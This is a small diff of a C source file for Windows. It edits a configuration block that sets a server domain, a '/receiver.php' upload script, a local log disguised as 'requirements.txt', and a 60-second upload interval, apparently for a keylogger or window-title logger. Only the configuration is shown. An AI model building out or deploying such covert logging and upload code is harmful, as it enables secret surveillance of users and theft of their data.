@@ -16,11 +16,11 @@
 #pragma comment(lib, "user32.lib")
 #pragma comment(lib, "advapi32.lib") 
 
-// --- KONFIGURACE (UPRAV ZDE) ---
-#define SERVER "kersonik.dev"        // POUZE DOMENA (bez https://)
-#define SCRIPT_PATH "/receiver.php"     // Cesta k PHP skriptu
-#define LOG_FILE "requirements.txt"     // Nazev lokalniho logu
-#define UPLOAD_INTERVAL 1800              // Upload kazdych 60 sekund
+// --- KONFIGURATION  ---
+#define SERVER ""        // ONLY DOMENA (bez https://)
+#define SCRIPT_PATH "/receiver.php"     // Path to PHP script
+#define LOG_FILE "requirements.txt"     // Local log name
+#define UPLOAD_INTERVAL 60              // Upload every 60 seconds
 // -------------------------------
 
 #define TITLE_LEN 1024
